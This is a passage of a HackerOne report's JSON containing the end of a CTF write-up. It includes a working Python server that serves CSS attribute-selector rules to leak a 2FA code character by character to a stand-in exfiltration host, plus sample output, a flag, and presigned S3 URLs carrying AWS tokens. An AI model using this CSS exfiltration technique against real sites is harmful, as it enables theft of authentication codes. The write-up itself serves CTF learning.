ThreadingMixIn\n\nclass CORSRequestHandler(BaseHTTPRequestHandler):\n    def end_headers(self):\n        self.send_header('Access-Control-Allow-Origin', '*')\n        self.send_header('Content-Type', 'text/css')\n        BaseHTTPRequestHandler.end_headers(self)\n\n    def do_GET(self):\n        if self.path.startswith('/css/'):\n            try:\n                global chars\n                print('Serving initial css-file')\n                self.send_response(200)\n                self.end_headers()\n                for token in chars:\n                    for i in range(0,8):\n                        self.wfile.write('[name=code_' + str(i) + '][value^=' + token + ']{background-image: url(https://[C2SERVER].xyz/exfil/?l=' + str(i) + '\u0026t=' + token + ');}\\r\\n'.encode('utf-8'))\n            except Exception as e:\n                print('Error at /css/:' + str(sys.exc_info()[0]))\n\n        if self.path.startswith('/exfil/'):\n            try:\n                query = urlparse(self.path).query\n                query_components = dict(qc.split('=') for qc in query.split('\u0026'))\n                token = query_components['t']\n                length = query_components['l']\n                print(str(length) + ':     ' + str(token))\n                self.send_response(200)\n                self.end_headers()\n            except Exception as e:\n                print('Error at /exfil/: ' + str(sys.exc_info()[0]))\n                if query:\n                    print('Got parameters: ' + str(query))\n        # The end\n\n    def log_message(self, format, *args):\n        return\n\n# Pro tip: prints out all printable ascii-chars!\nchars = string.printable\n\nclass ThreadedHTTPServer(ThreadingMixIn, HTTPServer):\n    \"\"\"Handle server\"\"\"\n\nif __name__ == '__main__':\n    # Run server with SSL and CORS, you'll need valid certs to get the headless browser to connect properly\n    print('Starting CSS Exfil server')\n    httpd = ThreadedHTTPServer(('0.0.0.0', 443), CORSRequestHandler)\n    httpd.socket = ssl.wrap_socket (httpd.socket, keyfile='/etc/letsencrypt/live/[C2SERVER].xyz/privkey.pem', certfile='/etc/letsencrypt/live/[C2SERVER].xyz/cert.pem', server_side=True)\n    httpd.serve_forever()\n```\n\nAnd when ran, output looks like following:\n\n```\n/h1ctf# python c2-server.py\nStarting CSS Exfil server\nServing initial css-file\nPath: /css/\n7:     D\n1:     g\n2:     l\n3:     s\n4:     F\n5:     X\n6:     I\n```\n\nAnd there we go! Submitting the values within 2 minutes and in correct arrangement passes the 2FA validation. The final response page was welcome with open arms. I had done it!\n\n{F862418}\n\n### ^FLAG^736c635d8842751b8aafa556154eb9f3$FLAG$\n\n\n## Closing words\n\nLearned a lot, met new friendly hackers, collaborated and didn't give up. All in all, extremely rewarding CTF. Thanks to everyone on the support staff to make this happen and see you next time!\n","automated_response":false,"created_at":"2020-06-10T13:57:09.959Z","updated_at":"2020-06-10T13:57:09.959Z","actor":{"username":"osintopsec","cleared":true,"url":"/osintopsec","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"attachments":[{"id":862420,"filename":"sandra_twitter.png","type":"image/png","url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/329Lvv8pHgRUSGvwzu1ZxS5V?response-content-disposition=attachment%3B%20filename%3D%22sandra_twitter.png%22%3B%20filename%2A%3DUTF-8%27%27sandra_twitter.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQ4IEPVQO5%2F20211011%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20211011T153915Z\u0026X-Amz-Expires=3600\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHYaCXVzLXdlc3QtMiJGMEQCIEfiwE8ABftQ4ZDSo2PcCdmgWGJAVhZBcjrVILPjej50AiACAJuLWZpiOUokpZpZYio1aaS1zedU6yBiP02ueFvn1iqDBAjv%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F8BEAIaDDAxMzYxOTI3NDg0OSIMwnKCmy9PUlqhlDykKtcDeye%2FigxH7oQuBLWPNAddVUxCetP%2B6VM%2FIfdoNEAf8dePeEZ6nfGVUDz0owpAQ8YnLRTgfKqbZIg9uvHiJY%2F4BbcoCSwwJdRGPldLb3Y3WlPcJ1JvXUEefleLwhstFskHZ2cPwg1VDGmKUpYSrXj0yczI934c5Lp8FHGi7k73DEu%2FAkrDbRnSZHG42WaaqPNNWImCdPeTEmq3NWpEt8cesOA6Xa4VqYMRs9drBzvQOySUd6OOKhFszrFCIooeL9FH3tfL1jRUt27tojJhfuYEL1%2BXkCSnEkXAKcWclEQwC3FfnY0XhghLZDzab25hU%2Bd2h1mXTSBw8U0KUeuS7BYp2gJWFyuMnua0PPwpsnfW%2B9HdmkGFEZMkcwfZlh9E6l1XmyYfjTKzbK4akQ37CPeaxglSuydRq%2BOr7eoa4bJwD8SbBbqyaFHvzfbmsQAD6vBhy3a3VJ%2FRjznM9l%2FDW%2BnlGoCNLaIcQRZvZ0zDR6x%2ByF%2BOA4LXd0zzf8we7BSGFKyQfoRnsOQpRday7KSiYLmMmNfRdBrUHLRHvgeo%2BpRsKlDHGprEYxVC9m%2FkU3USyz305DDgoYfE7CyGX%2FKauSdBx1ZrMRAhyMPdXtfyvzVr4uFs8EB9pzBTMM%2F%2FkIsGOqYBpHeiPK1x0yJBNNgdNDNHwOZb44D7QldQoMShvupPsVW7xgZ9egfooN5Hr7L7zQT0se6VW6MDEHSuh790gIEL3N2l3o4i8vRIQjRoeoSklFrZONuWaRaLdV2EJtaDDZ%2BwBg0kYTnQOYCaI2vJ3EB7BWjw1JRVBpZH6NvHFfING%2B%2Bhp9nGXAhqXdBxPezBeHqUbpMsZkRZrmnH1UVt5up6rjaXPnhY6Q%3D%3D\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Signature=a4b442327341f897025ac99a5eec885055b24ec5ae9e03d95fcd02f8a330f818"},{"id":862419,"filename":"md5_token.png","type":"image/png","url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/2qTZzccZHdW4GB9jrGTFsZjS?response-content-disposition=attachment%3B%20filename%3D%22md5_token.png%22%3B%20filename%2A%3DUTF-8%27%27md5_token.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQ4IEPVQO5%2F20211011%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20211011T153915Z\u0026X-Amz-Expires=3600\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHYaCXVzLXdlc3QtMiJGMEQCIEfiwE8ABftQ4ZDSo2PcCdmgWGJAVhZBcjrVILPjej50AiACAJuLWZpiOUokpZpZYio1aaS1zedU6yBiP02ueFvn1iqDBAjv%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F8BEAIaDDAxMzYxOTI3NDg0OSIMwnKCmy9PUlqhlDykKtcDeye%2FigxH7oQuBLWPNAddVUxCetP%2B6VM%2FIfdoNEAf8dePeEZ6nfGVUDz0owpAQ8YnLRTgfKqbZIg9uvHiJY%2F4BbcoCSwwJdRGPldLb3Y3WlPcJ1JvXUEefleLwhstFskHZ2cPwg1VDGmKUpYSrXj0yczI934c5Lp8FHGi7k73DEu%2FAkrDbRnSZHG42WaaqPNNWImCdPeTEmq3NWpEt8cesOA6Xa4VqYMRs9drBzvQOySUd6OOKhFszrFCIooeL9FH3tfL1jRUt27tojJhfuYEL1%2BXkCSnEkXAKcWclEQwC3FfnY0XhghLZDzab25hU%2Bd2h1mXTSBw8U0KUeuS7BYp2gJWFyuMnua0PPwpsnfW%2B9HdmkGFEZMkcwfZlh9E6l1XmyYfjTKzbK4akQ37CPeaxglSuydRq%2BOr7eoa4bJwD8SbBbqyaFHvzfbmsQAD6vBhy3a3VJ%2FRjznM9l%2FDW%2BnlGoCNLaIcQRZvZ0zDR6x%2ByF%2BOA4LXd0zzf8we7BSGFKyQfoRnsOQpRday7KSiYLmMmNfRdBrUHLRHvgeo%2BpRsKlDHGprEYxVC9m%2FkU3USyz305DDgoYfE7CyGX%2FKauSdBx1ZrMRAhyMPdXtfyvzVr4uFs8EB9pzBTMM%2F%2FkIsGOqYBpHeiPK1x0yJBNNgdNDNHwOZb44D7QldQoMShvupPsVW7xgZ9egfooN5Hr7L7zQT0se6VW6MDEHSuh790gIEL3N2l3o4i8vRIQjRoeoSklFrZONuWaRaLdV2EJtaDDZ%2BwBg0kYTnQOYCaI2vJ3EB7BWjw1JRVBpZH6NvHFfING%2B%2Bhp9nGXAhqXdBxPezBeHqUbpMsZkRZrmnH1UVt5up6rjaXPnhY6Q%3D%3D\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Signature=6df15d6bdc369ce289271fedea0eab4f2538552827499fcad9420c6ef935e9e0"},{"id":862418,"filename":"flag.png","type":"image/png","url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/BQgx27Gyg6TUjbsGasht8Bpo?response-content-disposition=attachment%3B%20filename%3D%22flag.png%22%3B%20filename%2A%3DUTF-8%27%27flag.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQ4IEPVQO5%2F20211011%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20211011T153915Z\u0026X-Amz-Expires=3600\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHYaCXVzLXdlc3QtMiJGMEQCIEfiwE8ABftQ4ZDSo2PcCdmgWGJAVhZBcjrVILPjej50AiACAJuLWZpiOUokpZpZYio1aaS1zedU6yBiP02ueFvn1iqDBAjv%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F8BEAIaDDAxMzYxOTI3NDg0OSIMwnKCmy9PUlqhlDykKtcDeye%2FigxH7oQuBLWPNAddVUxCetP%2B6VM%2FIfdoNEAf8dePeEZ6nfGVUDz0owpAQ8YnLRTgfKqbZIg9uvHiJY%2F4BbcoCSwwJdRGPldLb3Y3WlPcJ1JvXUEefleLwhstFskHZ2cPwg1VDGmKUpYSrXj0yczI934c5Lp8FHGi7k73DEu%2FAkrDbRnSZHG42WaaqPNNWImCdPeTEmq3NWpEt8cesOA6Xa4VqYMRs9drBzvQOySUd6OOKhFszrFCIooeL9FH3tfL1jRUt27tojJhfuYEL1%2BXkCSnEkXAKcWclEQwC3FfnY0XhghLZDzab25hU%2Bd2h1mXTSBw8U0KUeuS7BYp2gJWFyuMnua0PPwpsnfW%2B9HdmkGFEZMkcwfZlh9E6l1XmyYfjTKzbK4akQ37CPeaxglSuydRq%2BOr7eoa4bJwD8SbBbqyaFHvzfbmsQAD6vBhy3a3VJ%2FRjznM9l%2FDW%2BnlGoCNLaIcQRZvZ0zDR6x%2ByF%2BOA4LXd0zzf8we7BSGFKyQfoRnsOQpRday7KSiYLmMmNfRdBrUHLRHvgeo%2BpRsKlDHGprEYxVC9m%2FkU3USyz305DDgoYfE7CyGX%2FKauSdBx1ZrMRAhyMPdXtfyvzVr4uFs8EB9pzBTMM%2F%2FkIsGOqYBpHeiPK1x0yJBNNgdNDNHwOZb44D7QldQoMShvupPsVW7xgZ9egfooN5Hr7L7zQT0se6VW6MDEHSuh790gIEL3N2l3o4i8vRIQjRoeoSklFrZONuWaRaLdV2EJtaDDZ%2BwBg0kYTnQOYCaI2vJ3EB7BWjw1JRVBpZH6NvHFfING%2B%2Bhp9nGXAhqXdBxPezBeHqUbpMsZkRZrmnH1UVt5up6rjaXPnhY6Q%3D%3D\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Signature=14275e96ff865c96e1ca32db0fc33117901e2aedb6976307315fa72f115b2b46"},{"id":862417,"filename":"ctf_start_tweet.png","type":"image/png","url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/pWzmshLJ94i8M53smQNqNRNJ?response-content-disposition=attachment%3B%20filename%3D%22ctf_start_tweet.png%22%3B%20filename%2A%3DUTF-8%27%27ctf_start_tweet.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQ4IEPVQO5%2F20211011%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20211011T153915Z\u0026X-Amz-Expires=3600\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHYaCXVzLXdlc3QtMiJGMEQCIEfiwE8ABftQ4ZDSo2PcCdmgWGJAVhZBcjrVILPjej50AiACAJuLWZpiOUokpZpZYio1aaS1zedU6yBiP02ueFvn1iqDBAjv%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F8BEAIaDDAxMzYxOTI3NDg0OSIMwnKCmy9PUlqhlDykKtcDeye%2FigxH7oQuBLWPNAddVUxCetP%2B6VM%2FIfdoNEAf8dePeEZ6nfGVUDz0owpAQ8YnLRTgfKqbZIg9uvHiJY%2F4BbcoCSwwJdRGPldLb3Y3WlPcJ1JvXUEefleLwhstFskHZ2cPwg1VDGmKUpYSrXj0yczI934c5Lp8FHGi7k73DEu%2FAkrDbRnSZHG42WaaqPNNWImCdPeTEmq3NWpEt8cesOA6Xa4VqYMRs9drBzvQOySUd6OOKhFszrFCIooeL9FH3tfL1jRUt27tojJhfuYEL1%2BXkCSnEkXAKcWclEQwC3FfnY0XhghLZDzab25hU%2Bd2h1mXTSBw8U0KUeuS7BYp2gJWFyuMnua0PPwpsnfW%2B9HdmkGFEZMkcwfZlh9E6l1XmyYfjTKzbK4akQ37CPeaxglSuydRq%2BOr7eoa4bJwD8SbBbqyaFHvzfbmsQAD6vBhy3a3VJ%2FRjznM9l%2FDW%2BnlGoCNLaIcQRZvZ0zDR6x%2ByF%2BOA4LXd0zzf8we7BSGFKyQfoRnsOQpRday7KSiYLmMmNfRdBrUHLRHvgeo%2BpRsKlDHGprEYxVC9m%2FkU3USyz305DDgoYfE7CyGX%2FKauSdBx1ZrMRAhyMPdXtfyvzVr4uFs8EB9pzBTMM%2F%2FkIsGOqYBpHeiPK1x0yJBNNgdNDNHwOZb44D7QldQoMShvupPsVW7xgZ9egfooN5Hr7L7zQT0se6VW6MDEHSuh790gIEL3N2l3o4i8vRIQjRoeoSklFrZONuWaRaLdV2EJtaDDZ%2BwBg0kYTnQOYCaI2vJ3EB7BWjw1JRVBpZH6NvHFfING%2B%2Bhp9nGXAhqXdBxPezBeHqUbpMsZkRZrmnH1UVt5up6rjaXPnhY6Q%3D%3D\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Signature=5615e8fcba58c223ba14cd93cf84906d2e1dd6eb5cd44bfa3e3f153b647f7662"},{"id":862416,"filename":"congrats_activity.png","type":"image/png","url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/aq9KVmDucgNb1nZBsa2xG17a?response-content-disposition=attachment%3B%20filename%3D%22congrats_activity.png%22%3B%20filename%2A%3DUTF-8%27%27congrats_activity.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQ4IEPVQO5%2F20211011%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20211011T153915Z\u0026X-Amz-Expires=3600\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHYaCXVzLXdlc3QtMiJGMEQCIEfiwE8ABftQ4ZDSo2PcCdmgWGJAVhZBcjrVILPjej50AiACAJuLWZpiOUokpZpZYio1aaS1zedU6yBiP02ueFvn1iqDBAjv%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F8BEAIaDDAxMzYxOTI3NDg0OSIMwnKCmy9PUlqhlDykKtcDeye%2FigxH7oQuBLWPNAddVUxCetP%2B6VM%2FIfdoNEAf8dePeEZ6nfGVUDz0owpAQ8YnLRTgfKqbZIg9uvHiJY%2F4BbcoCSwwJdRGPldLb3Y3WlPcJ1JvXUEefleLwhstFskHZ2cPwg1VDGmKUpYSrXj0yczI934c5Lp8FHGi7k73DEu%2FAkrDbRnSZHG42WaaqPNNWImCdPeTEmq3NWpEt8cesOA6Xa4VqYMRs9drBzvQOySUd6OOKhFszrFCIooeL9FH3tfL1jRUt27tojJhfuYEL1%2BXkCSnEkXAKcWclEQwC3FfnY0XhghLZDzab25hU%2Bd2h1mXTSBw8U0KUeuS7BYp2gJWFyuMnua0PPwpsnfW%2B9HdmkGFEZMkcwfZlh9E6l1XmyYfjTKzbK4akQ37CPeaxglSuydRq%2BOr7eoa4bJwD8SbBbqyaFHvzfbmsQAD6vBhy3a3VJ%2FRjznM9l%2FDW%2BnlGoCNLaIcQRZvZ0zDR6x%2ByF%2BOA4LXd0zzf8we7BSGFKyQfoRnsOQpRday7KSiYLmMmNfRdBrUHLRHvgeo%2BpRsKlDHGprEYxVC9m%2FkU3USyz305DDgoYfE7CyGX%2FKauSdBx1ZrMRAhyMPdXtfyvzVr4uFs8EB9pzBTMM%2F%2FkIsGOqYBpHeiPK1x0yJBNNgdNDNHwOZb44D7QldQoMShvupPsVW7xgZ9egfooN5Hr7L7zQT0se6VW6MDEHSuh790gIEL3N2l3o4i8vRIQjRoeoSklFrZONuWaRaLdV2EJtaDDZ%2BwBg0kYTnQOYCaI2vJ3EB7BWjw1JRVBpZH6NvHFfING%2B%2Bhp9nGXAhqXdBxPezBeHqUbpMsZkRZrmnH1UVt5up6rjaXPnhY6Q%3D%3D\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Signature=b91d979c4244e5325daf96bc8ade8a218c5d0ac361adc5111810806d9ddd5f16"},{"id":862415,"filename":"bphq_twitter.png","type":"image/png","url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/ktpHktvzSpT35R1PsmvEW5bR?response-content-disposition=attachment%3B%20filename%3D%22bphq_twitter.png%22%3B%20filename%2A%3DUTF-8%27%27bphq_twitter.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQ4IEPVQO5%2F20211011%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20211011T153915Z\u0026X-Amz-Expires=3600\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHYaCXVzLXdlc3QtMiJGMEQCIEfiwE8ABftQ4ZDSo2PcCdmgWGJAVhZBcjrVILPjej50AiACAJuLWZpiOUokpZpZYio1aaS1zedU6yBiP02ueFvn1iqDBAjv%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F8BEAIaDDAxMzYxOTI3NDg0OSIMwnKCmy9PUlqhlDykKtcDeye%2FigxH7oQuBLWPNAddVUxCetP%2B6VM%2FIfdoNEAf8dePeEZ6nfGVUDz0owpAQ8YnLRTgfKqbZIg9uvHiJY%2F4BbcoCSwwJdRGPldLb3Y3WlPcJ1JvXUEefleLwhstFskHZ2cPwg1VDGmKUpYSrXj0yczI934c5Lp8FHGi7k73DEu%2FAkrDbRnSZHG42WaaqPNNWImCdPeTEmq3NWpEt8cesOA6Xa4VqYMRs9drBzvQOySUd6OOKhFszrFCIooeL9FH3tfL1jRUt27tojJhfuYEL1%2BXkCSnEkXAKcWclEQwC3FfnY0XhghLZDzab25hU%2Bd2h1mXTSBw8U0KUeuS7BYp2gJWFyuMnua0PPwpsnfW%2B9HdmkGFEZMkcwfZlh9E6l1XmyYfjTKzbK4akQ37CPeaxglSuydRq%2BOr7eoa4bJwD8SbBbqyaFHvzfbmsQAD6vBhy3a3VJ%2FRjznM9l%2FDW%2BnlGoCNLaIcQRZvZ0zDR6x%2ByF%2BOA4LXd0zzf8we7BSGFKyQfoRnsOQpRday7KSiYLmMmNfRdBrUHLRHvgeo%2BpRsKlDHGprEYxVC9m%2FkU3USyz305DDgoYfE7CyGX%2FKauSdBx1ZrMRAhyMPdXtfyvzVr4uFs8EB9pzBTMM%2F%2FkIsGOqYBpHeiPK1x0yJBNNgdNDNHwOZb44D7QldQoMShvupPsVW7xgZ9egfooN5Hr7L7zQT0se6VW6MDEHSuh790gIEL3N2l3o4i8vRIQjRoeoSklFrZONuWaRaLdV2EJtaDDZ%2BwBg0kYTnQOYCaI2vJ3EB7BWjw1JRVBpZH6NvHFfING%2B%2Bhp9nGXAhqXdBxPezBeHqUbpMsZkRZrmnH1UVt5up6rjaXPnhY6Q%3D%3D\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Signature=8aa53c11d8ff10e0014c081c096bb8686ea31e478115d9c8feb211e67e364a47"},{"id":862414,"filename":"admin_tab.png","type":"image/png","url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/ZTbg2xbrVT5Dcew9G57CKa5i?response-content-disposition=attachment%3B%20filename%3D%22admin_tab.png%22%3B%20filename%2A%3DUTF-8%27%27admin_tab.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQ4IEPVQO5%2F20211011%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20211011T153915Z\u0026X-Amz-Expires=3600\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHYaCXVzLXdlc3QtMiJGMEQCIEfiwE8ABftQ4ZDSo2PcCdmgWGJAVhZBcjrVILPjej50AiACAJuLWZpiOUokpZpZYio1aaS1zedU6yBiP02ueFvn1iqDBAjv%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F8BEAIaDDAxMzYxOTI3NDg0OSIMwnKCmy9PUlqhlDykKtcDeye%2FigxH7oQuBLWPNAddVUxCetP%2B6VM%2FIfdoNEAf8dePeEZ6nfGVUDz0owpAQ8YnLRTgfKqbZIg9uvHiJY%2F4BbcoCSwwJdRGPldLb3Y3WlPcJ1JvXUEefleLwhstFskHZ2cPwg1VDGmKUpYSrXj0yczI934c5Lp8FHGi7k73DEu%2FAkrDbRnSZHG42WaaqPNNWImCdPeTEmq3NWpEt8cesOA6Xa4VqYMRs9drBzvQOySUd6OOKhFszrFCIooeL9FH3tfL1jRUt27tojJhfuYEL1%2BXkCSnEkXAKcWclEQwC3FfnY0XhghLZDzab25hU%2Bd2h1mXTSBw8U0KUeuS7BYp2gJWFyuMnua0PPwpsnfW%2B9HdmkGFEZMkcwfZlh9E6l1XmyYfjTKzbK4akQ37CPeaxglSuydRq%2BOr7eoa4bJwD8SbBbqyaFHvzfbmsQAD6vBhy3a3VJ%2FRjznM9l%2FDW%2BnlGoCNLaIcQRZvZ0zDR6x%2ByF%2BOA4LXd0zzf8we7BSGFKyQfoRnsOQpRday7KSiYLmMmNfRdBrUHLRHvgeo%2BpRsKlDHGprEYxVC9m%2FkU3USyz305DDgoYfE7CyGX%2FKauSdBx1ZrMRAhyMPdXtfyvzVr4uFs8EB9pzBTMM%2F%2FkIsGOqYBpHeiPK1x0yJBNNgdNDNHwOZb44D7QldQoMShvupPsVW7xgZ9egfooN5Hr7L7zQT0se6VW6MDEHSuh790gIEL3N2l3o4i8vRIQjRoeoSklFrZONuWaRaLdV2EJtaDDZ%2BwBg0kYTnQOYCaI2vJ3EB7BWjw1JRVBpZH6NvHFfING%2B%2Bhp9nGXAhqXdBxPezBeHqUbpMsZkRZrmnH1UVt5up6rjaXPnhY6Q%3D%3D\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Signature=b258a7faabb1d624832261ba8d3e832388a590ddf86e2c1b7282637cdd8d84dd"},{"id":862413,"filename":"1st_2FA.png","type":"image/png","url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/YkrDhTNEAf5XGCzRP2Wv44RZ?response-content-disposition=attachment%3B%20filename%3D%221st_2FA.png%22%3B%20filename%2A%3DUTF-8%27%271st_2FA.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQ4IEPVQO5%2F20211011%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20211011T153915Z\u0026X-Amz-Expires=3600\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHYaCXVzLXdlc3QtMiJGMEQCIEfiwE8ABftQ4ZDSo2PcCdmgWGJAVhZBcjrVILPjej50AiACAJuLWZpiOUokpZpZYio1aaS1zedU6yBiP02ueFvn1iqDBAjv%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F8BEAIaDDAxMzYxOTI3NDg0OSIMwnKCmy9PUlqhlDykKtcDeye%2FigxH7oQuBLWPNAddVUxCetP%2B6VM%2FIfdoNEAf8dePeEZ6nfGVUDz0owpAQ8YnLRTgfKqbZIg9uvHiJY%2F4BbcoCSwwJdRGPldLb3Y3WlPcJ1JvXUEefleLwhstFskHZ2cPwg1VDGmKUpYSrXj0yczI934c5Lp8FHGi7k73DEu%2FAkrDbRnSZHG42WaaqPNNWImCdPeTEmq3NWpEt8cesOA6Xa4VqYMRs9drBzvQOySUd6OOKhFszrFCIooeL9FH3tfL1jRUt27tojJhfuYEL1%2BXkCSnEkXAKcWclEQwC3FfnY0XhghLZDzab25hU%2Bd2h1mXTSBw8U0KUeuS7BYp2gJWFyuMnua0PPwpsnfW%2B9HdmkGFEZMkcwfZlh9E6l1XmyYfjTKzbK4akQ37CPeaxglSuydRq%2BOr7eoa4bJwD8SbBbqyaFHvzfbmsQAD6vBhy3a3VJ%2FRjznM9l%2FDW%2BnlGoCNLaIcQRZvZ0zDR6x%2ByF%2BOA4LXd0zzf8we7BSGFKyQfoRnsOQpRday7KSiYLmMmNfRdBrUHLRHvgeo%2BpRsKlDHGprEYxVC9m%2FkU3USyz305DDgoYfE7CyGX%2FKauSdBx1ZrMRAhyMPdXtfyvzVr4uFs8EB9pzBTMM%2F%2FkIsGOqYBpHeiPK1x0yJBNNgdNDNHwOZb44D7QldQoMShvupPsVW7xgZ9egfooN5Hr7L7zQT0se6VW6MDEHSuh790gIEL3N2l3o4i8vRIQjRoeoSklFrZONuWaRaLdV2EJtaDDZ%2BwBg0kYTnQOYCaI2vJ3EB7BWjw1JRVBpZH6NvHFfING%2B%2Bhp9nGXAhqXdBxPezBeHqUbpMsZkRZrmnH1UVt5up6rjaXPnhY6Q%3D%3D\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Signature=1a24b16faea08d32fb0bce73732fa9851bb43962940268e1a711475295dc4945"}],"genius_execution_id":null,"team_handle":"h1-ctf","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":8268310,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hello,\n\nI wanted to personally thank you for participating in the #h12006 2020 CTF, I hope you enjoyed the challenge! We received tons of great submission and it definitely made our decision a lot harder than we excepted. Unfortunately, since we only have a limited number of invites available, your write up was not selected for this event. We appreciate your hard work and we hope to see you participate in our next CTF!\n\nWe will send you a request to publicly disclose your submissions next week, so please hold on to your writeups, we'll make sure to let you know when you can publish them on your site!\n\nIf you were one of the first 10 people to submit a write-up,  look out for some private invite in the next few days!","automated_response":false,"created_at":"2020-06-11T23:03:03.632Z","updated_at":"2020-06-11T23:03:03.632Z","actor":{"username":"nahamsec","cleared":true,"url":"/nahamsec","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/002/413/ab3559068530ebd67a8224a9da7821be178dda07_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":true},"genius_execution_id":null,"team_handle":"h1-ctf","actor_is_team_member":true,"actor_is_concealed_member":true},{"id":8271069,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Sure, no props! After all, learning is the thing, right? :)","automated_response":false,"created_at":"2020-06-12T09:07:29.943Z","updated_at":"2020-06-12T09:07:29.943Z","actor":{"username":"osintopsec","cleared":true,"url":"/osintopsec","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"h1-ctf","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":8324930,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"Thank you again for participating in the #h12006 CTF! ","automated_response":false,"created_at":"2020-06-17T22:27:41.064Z","updated_at":"2020-06-17T22:27:41.064Z","actor":{"username":"nahamsec","cleared":true,"url":"/nahamsec","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/002/413/ab3559068530ebd67a8224a9da7821be178dda07_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":true},"reporter":{"username":"osintopsec","url":"/osintopsec"},"genius_execution_id":null,"team_handle":"h1-ctf","actor_is_team_member":true,"actor_is_concealed_member":true},{"id":8329116,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","automated_response":false,"created_at":"2020-06-18T09:11:54.738Z","updated_at":"2020-06-18T09:11:54.738Z","first_to_agree":true,"actor":{"username":"osintopsec","cleared":true,"url":"/osintopsec","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"h1-ctf","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":8332770,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","automated_response":false,"created_at":"2020-06-18T15:28:15.229Z","updated_at":"2020-06-18T15:28:15.229Z","actor":{"username":"nahamsec","cleared":true,"url":"/nahamsec","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/002/413/ab3559068530ebd67a8224a9da7821be178dda07_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":true},"genius_execution_id":null,"team_handle":"h1-ctf","actor_is_team_member":true,"actor_is_concealed_member":true},{"id":8332771,"is_internal":false,"editable":fals